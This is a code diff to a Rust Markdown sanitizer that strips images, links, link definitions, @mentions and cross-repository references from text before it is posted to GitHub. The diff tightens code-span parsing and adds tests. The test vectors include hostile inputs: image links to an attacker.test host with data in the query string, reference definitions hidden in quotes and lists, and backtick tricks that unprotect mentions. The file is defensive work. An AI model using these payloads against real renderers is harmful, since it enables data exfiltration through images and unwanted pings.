@@ -14,11 +14,24 @@
 //!   code span,
 //! * at most `max_body_bytes`.
 //!
-//! The rules are applied to the whole text without trying to understand code spans or fences.
-//! Two parsers that disagree about where a code span ends are a way around a filter, so the filter
-//! does not rely on knowing. The cost is that a `<` that starts a tag inside a code block shows as
-//! `&lt;`. A body that is already clean is returned unchanged, and cleaning twice gives the same
+//! The rules are applied to the whole text without trying to understand fences or the block
+//! structure of the Markdown. Two parsers that disagree about where a block ends are a way around a
+//! filter, so the filter does not rely on knowing. The cost is that a `<` that starts a tag inside a
+//! code block shows as `&lt;`, and that a mention inside a code block is written in a code span of
+//! its own. A body that is already clean is returned unchanged, and cleaning twice gives the same
 //! result.
+//!
+//! # Mentions and the backtick
+//!
+//! A mention or a reference is left alone only when it sits inside a code span that opens and
+//! closes on the same line (see `code_span_flags`), read the way CommonMark reads backtick strings:
+//! a string of `n` backticks opens a span that the next string of exactly `n` backticks closes, a
+//! backslash escapes a backtick outside a span, and a string that finds no partner is plain text. A
+//! lone backtick therefore protects nothing (AUT-7). A span that holds a pipe is not trusted either,
+//! because a table row is split at its pipes before spans are read. Every other mention is written
+//! in a span whose backtick string has a length no other string in the text has, so no backtick that
+//! is already there can pair with it, and it is set apart by a space from a backtick or a backslash
+//! next to it, so it cannot merge with one.
 //!
 //! UNVERIFIED against GitHub's renderer: the filter was written from the CommonMark and GFM rules
 //! and tested with the vectors of NT-SEC-04, not by rendering text on GitHub.
@@ -236,12 +249,19 @@ fn neutralize_links(text: &str, domains: &[String]) -> String {
                     continue;
                 }
                 if let Some(url) = url {
-                    if host_allowed(url.split_whitespace().next().unwrap_or(""), domains) {
-                        let whole: String =
-                            chars.get(index..end).unwrap_or_default().iter().collect();
-                        out.push_str(&whole);
+                    let destination = url.split_whitespace().next().unwrap_or("");
+                    let words = neutralize_links(&label, domains);
+                    if host_allowed(destination, domains) {
+                        // The label is cleaned like any other text: an image in it is removed
+                        // (AUT-6). The title is dropped; only the address is kept, as it was
+                        // checked.
+                        out.push('[');
+                        out.push_str(&words);
+                        out.push_str("](");
+                        out.push_str(destination);
+                        out.push(')');
                     } else {
-                        out.push_str(&neutralize_links(&label, domains));
+                        out.push_str(&words);
                     }
                     index = end;
                     continue;
@@ -254,17 +274,39 @@ fn neutralize_links(text: &str, domains: &[String]) -> String {
     drop_definitions(&out)
 }
 
-/// Removes lines of the form `[label]: destination`.
+/// True when the line starts a link reference definition, `[label]: destination`, once the
+/// markers of the containers around it are removed: a block quote (`>`) or a list item (`-`, `*`,
+/// `+`, `1.` or `1)`), each of them up to three spaces in. A definition in a quote or a list item is
+/// as much a definition as one at the left margin (AUT-6).
+fn is_definition(line: &str) -> bool {
+    let mut rest = line;
+    for _ in 0..16 {
+        let trimmed = rest.trim_start_matches(' ');
+        if rest.len() - trimmed.len() > 3 {
+            return false;
+        }
+        if let Some(after) = trimmed.strip_prefix('>') {
+            rest = after;
+            continue;
+        }
+        let bullet = trimmed.strip_prefix(['-', '*', '+']);
+        let digits = trimmed.trim_start_matches(|c: char| c.is_ascii_digit());
+        let numbered = (trimmed.len() > digits.len() && trimmed.len() - digits.len() <= 9)
+            .then(|| digits.strip_prefix(['.', ')']))
+            .flatten();
+        if let Some(after) = bullet.or(numbered).filter(|after| after.starts_with(' ')) {
+            rest = after;
+            continue;
+        }
+        return trimmed.starts_with('[') && trimmed.find("]:").is_some_and(|at| at > 1);
+    }
+    false
+}
+
+/// Removes lines of the form `[label]: destination`, also inside block quotes and list items.
 fn drop_definitions(text: &str) -> String {
     text.split('\n')
-        .filter(|line| {
-            let trimmed = line.trim_start();
-            let indent_ok = line.len() - trimmed.len() <= 3;
-            let is_definition = indent_ok
-                && trimmed.starts_with('[')
-                && trimmed.find("]:").is_some_and(|at| at > 1);
-            !is_definition
-        })
+        .filter(|line| !is_definition(line))
         .collect::<Vec<_>>()
         .join("\n")
 }
@@ -302,14 +344,129 @@ fn is_word(c: char) -> bool {
     c.is_ascii_alphanumeric() || matches!(c, '_' | '-')
 }
 
+/// The number of backticks in the string that starts at `from`.
+fn backtick_run(chars: &[char], from: usize) -> usize {
+    chars
+        .get(from..)
+        .unwrap_or_default()
+        .iter()
+        .take_while(|c| **c == '`')
+        .count()
+}
+
+/// The start of the next backtick string of exactly `length` backticks at or after `from`.
+fn closing_run(chars: &[char], from: usize, length: usize) -> Option<usize> {
+    let mut index = from;
+    while index < chars.len() {
+        if chars.get(index) == Some(&'`') {
+            let run = backtick_run(chars, index);
+            if run == length {
+                return Some(index);
+            }
+            index += run;
+        } else {
+            index += 1;
+        }
+    }
+    None
+}
+
+/// Marks the characters of one line that sit inside a code span, delimiters included.
+fn mark_spans(line: &[char], flags: &mut [bool]) {
+    let mut index = 0;
+    while index < line.len() {
+        match line.get(index) {
+            // Outside a span a backslash escapes the punctuation after it, a backtick included.
+            Some('\\') if line.get(index + 1).is_some_and(char::is_ascii_punctuation) => {
+                index += 2;
+            }
+            Some('`') => {
+                let length = backtick_run(line, index);
+                let content = index + length;
+                match closing_run(line, content, length) {
+                    // A table row is cut at its pipes before spans are read, so a span with a pipe
+                    // in it may not be a span at all.
+                    Some(close) if !line.get(content..close).unwrap_or_default().contains(&'|') => {
+                        if let Some(span) = flags.get_mut(index..close + length) {
+                            span.fill(true);
+                        }
+                        index = close + length;
+                    }
+                    _ => index = content,
+                }
+            }
+            _ => index += 1,
+        }
+    }
+}
+
+/// For every character of `chars`: true when it is inside a code span that opens and closes on its
+/// line. A span that runs over several lines is not trusted, which makes a mention in one get a span
+/// of its own: the cost is a few backticks, and the gain is that no block structure has to be
+/// guessed.
+fn code_span_flags(chars: &[char]) -> Vec<bool> {
+    let mut flags = vec![false; chars.len()];
+    let mut start = 0;
+    while start <= chars.len() {
+        let end = chars
+            .get(start..)
+            .and_then(|rest| rest.iter().position(|c| *c == '\n'))
+            .map_or(chars.len(), |at| start + at);
+        if let (Some(line), Some(marks)) = (chars.get(start..end), flags.get_mut(start..end)) {
+            mark_spans(line, marks);
+        }
+        start = end + 1;
+    }
+    flags
+}
+
+/// The length of the backtick string for the spans this pass writes: the smallest length that no
+/// backtick string in the text has, so that none of them can pair with one of ours.
+fn own_delimiter_length(chars: &[char]) -> usize {
+    let mut taken = std::collections::BTreeSet::new();
+    let mut index = 0;
+    while index < chars.len() {
+        if chars.get(index) == Some(&'`') {
+            let run = backtick_run(chars, index);
+            taken.insert(run);
+            // A backslash in front of the string escapes its first backtick, so the string that
+            // is left is one shorter.
+            if index > 0 && chars.get(index - 1) == Some(&'\\') && run > 1 {
+                taken.insert(run - 1);
+            }
+            index += run;
+        } else {
+            index += 1;
+        }
+    }
+    (1..).find(|length| !taken.contains(length)).unwrap_or(1)
+}
+
+/// Writes `content` in a code span, set apart from what is next to it.
+fn push_code_span(out: &mut String, content: &str, delimiter: usize, next: Option<char>) {
+    if out.ends_with(['`', '\\']) {
+        out.push(' ');
+    }
+    let fence = "`".repeat(delimiter);
+    out.push_str(&fence);
+    out.push_str(content);
+    out.push_str(&fence);
+    if next == Some('`') {
+        out.push(' ');
+    }
+}
+
 /// Pass C: bare URLs, `@mentions` and `owner/repo#N` references, in one scan.
 fn neutralize_tokens(text: &str, domains: &[String]) -> String {
     let chars: Vec<char> = text.chars().collect();
+    let in_span = code_span_flags(&chars);
+    let delimiter = own_delimiter_length(&chars);
     let mut out = String::with_capacity(text.len());
     let mut index = 0;
     while let Some(c) = chars.get(index).copied() {
         let previous = index.checked_sub(1).and_then(|i| chars.get(i)).copied();
         let at_boundary = previous.is_none_or(|p| !p.is_ascii_alphanumeric());
+        let protected = in_span.get(index).copied().unwrap_or(false);
         let rest: String = chars
             .get(index..(index + 8).min(chars.len()))
             .unwrap_or_default()
@@ -340,7 +497,8 @@ fn neutralize_tokens(text: &str, domains: &[String]) -> String {
             continue;
         }
         if c == '@'
-            && previous.is_none_or(|p| !is_word(p) && p != '@' && p != '`')
+            && !protected
+            && previous.is_none_or(|p| !is_word(p) && p != '@')
             && chars
                 .get(index + 1)
                 .is_some_and(|n| n.is_ascii_alphanumeric())
@@ -350,21 +508,17 @@ fn neutralize_tokens(text: &str, domains: &[String]) -> String {
                 end += 1;
             }
             let name: String = chars.get(index..end).unwrap_or_default().iter().collect();
-            out.push('`');
-            out.push_str(&name);
-            out.push('`');
+            push_code_span(&mut out, &name, delimiter, chars.get(end).copied());
             index = end;
             continue;
         }
         if at_boundary
-            && previous != Some('`')
+            && !protected
             && c.is_ascii_alphanumeric()
             && let Some(end) = cross_repository_reference(&chars, index)
         {
             let reference: String = chars.get(index..end).unwrap_or_default().iter().collect();
-            out.push('`');
-            out.push_str(&reference);
-            out.push('`');
+            push_code_span(&mut out, &reference, delimiter, chars.get(end).copied());
             index = end;
             continue;
         }
@@ -531,6 +685,163 @@ mod tests {
         let hostile = "![x](https://a.test/?d=1) [y](https://b.test) @alice other/repo#9 <b>bold</b> https://c.test/z <!-- c --> [r]: https://d.test\n[r]: https://e.test";
         let once = clean(hostile);
         assert_eq!(clean(&once), once);
+    }
+
+    /// What a reader of CommonMark would see outside every code span, with the spans read over a
+    /// whole paragraph (a looser reading than the filter's, which trusts a span only on one line).
+    /// An independent check: it shares no code with the filter.
+    fn outside_code_spans(text: &str) -> String {
+        let mut shown = String::new();
+        for paragraph in text.split("\n\n") {
+            let chars: Vec<char> = paragraph.chars().collect();
+            let mut index = 0;
+            while index < chars.len() {
+                let c = chars[index];
+                if c == '\\' && chars.get(index + 1).is_some_and(char::is_ascii_punctuation) {
+                    shown.push(c);
+                    shown.push(chars[index + 1]);
+                    index += 2;
+                } else if c == '`' {
+                    let run = chars[index..].iter().take_while(|x| **x == '`').count();
+                    let mut search = index + run;
+                    let mut close = None;
+                    while search < chars.len() {
+                        if chars[search] == '`' {
+                            let other = chars[search..].iter().take_while(|x| **x == '`').count();
+                            if other == run {
+                                close = Some(search + other);
+                                break;
+                            }
+                            search += other;
+                        } else {
+                            search += 1;
+                        }
+                    }
+                    match close {
+                        Some(end) => {
+                            shown.push(' ');
+                            index = end;
+                        }
+                        None => {
+                            shown.extend(std::iter::repeat_n('`', run));
+                            index += run;
+                        }
+                    }
+                } else {
+                    shown.push(c);
+                    index += 1;
+                }
+            }
+            shown.push_str("\n\n");
+        }
+        shown
+    }
+
+    fn assert_inert(text: &str) {
+        let cleaned = clean(text);
+        let shown = outside_code_spans(&cleaned);
+        assert!(
+            !shown.contains('@'),
+            "{text:?} -> {cleaned:?} leaves a mention outside a code span: {shown:?}"
+        );
+        assert!(
+            !shown.contains("victim/repo#"),
+            "{text:?} -> {cleaned:?} leaves a reference outside a code span: {shown:?}"
+        );
+        assert_eq!(clean(&cleaned), cleaned, "{text:?}: cleaning twice differs");
+    }
+
+    #[test]
+    fn a_backtick_that_closes_nothing_protects_no_mention_and_no_reference() {
+        for text in [
+            "Please look, `@example-org/security-team now",
+            "See `victim/repo#12 for details",
+            "``@a`",
+            "`@a``",
+            "\\`@a`",
+            "```@a",
+            "x `` y `@a z",
+            "line `\n@team `",
+            "# heading `\n@team `",
+            "```\n`\n```\n@team `",
+            "| `@x | y` |",
+            "`one` and `@team",
+            "`a` `@b` `@c",
+            "`@a` and `` ` `` and `@b",
+            "`` `@a` ",
+            "text `@a`@b",
+            "`victim/repo#12",
+            "@a`@b`@c`",
+            "``@a`` `@b",
+        ] {
+            assert_inert(text);
+        }
+    }
+
+    #[test]
+    fn our_own_span_cannot_pair_with_a_backtick_that_is_already_there() {
+        // The text uses the lengths 1, 2 and 3, so the span is made with 4.
+        let cleaned = clean("` `` ``` @a");
+        assert!(cleaned.contains("````@a````"), "{cleaned:?}");
+        // A backtick next to the mention is set apart from the span by a space.
+        let cleaned = clean("`@a");
+        assert_eq!(cleaned, "` ``@a``");
+        assert_eq!(clean("@a`"), "``@a`` `");
+        assert_eq!(clean("\\@a"), "\\ `@a`");
+    }
+
+    #[test]
+    fn a_mention_inside_a_span_that_closes_on_its_line_is_left_alone() {
+        for text in [
+            "already `@octocat` here",
+            "`victim/repo#12` is fine",
+            "`` `@a` ``",
+            "a `x` and `@b` and `y`",
+        ] {
+            assert_eq!(clean(text), text);
+        }
+        // A span with a pipe in it is not trusted: a table row is cut at its pipes first.
+        let cleaned = clean("| `@x | y` |");
+        assert!(cleaned.contains("``@x``"), "{cleaned:?}");
+    }
+
+    #[test]
+    fn an_image_inside_a_link_to_an_allowed_host_is_removed() {
+        let cleaned =
+            clean("[![chart](//attacker.test/b.png?d=1)](https://github.com/example-org/fixture)");
+        assert_eq!(
+            cleaned,
+            "[(image removed)](https://github.com/example-org/fixture)"
+        );
+        let nested = clean(
+            "[a [![x](//attacker.test/i.png)](https://github.com/o/r) b](https://github.com/o/r)",
+        );
+        assert!(!nested.contains("attacker.test"), "{nested:?}");
+        assert!(!nested.contains("!["), "{nested:?}");
+        // A title is dropped, because it can hold anything.
+        let titled = clean("[x](https://github.com/o/r \"![i](//attacker.test/x)\")");
+        assert_eq!(titled, "[x](https://github.com/o/r)");
+    }
+
+    #[test]
+    fn a_definition_in_a_quote_or_a_list_item_is_dropped() {
+        for text in [
+            "[![chart][r]](https://github.com/o/r)\n\n> [r]: //attacker.test/b.png",
+            "![x][r]\n\n> > [r]: //attacker.test/b.png",
+            "![x][r]\n\n- [r]: //attacker.test/b.png",
+            "![x][r]\n\n1. [r]: //attacker.test/b.png",
+            "![x][r]\n\n   > - [r]: //attacker.test/b.png",
+        ] {
+            let cleaned = clean(text);
+            assert!(
+                !cleaned.contains("attacker.test"),
+                "{text:?} -> {cleaned:?}"
+            );
+            assert!(!cleaned.contains("]: "), "{text:?} -> {cleaned:?}");
+        }
+        // A line that only looks like one is kept.
+        assert_eq!(clean("a [note]: here"), "a [note]: here");
+        assert_eq!(clean("    [code]: indented"), "    [code]: indented");
     }
 
     #[test]
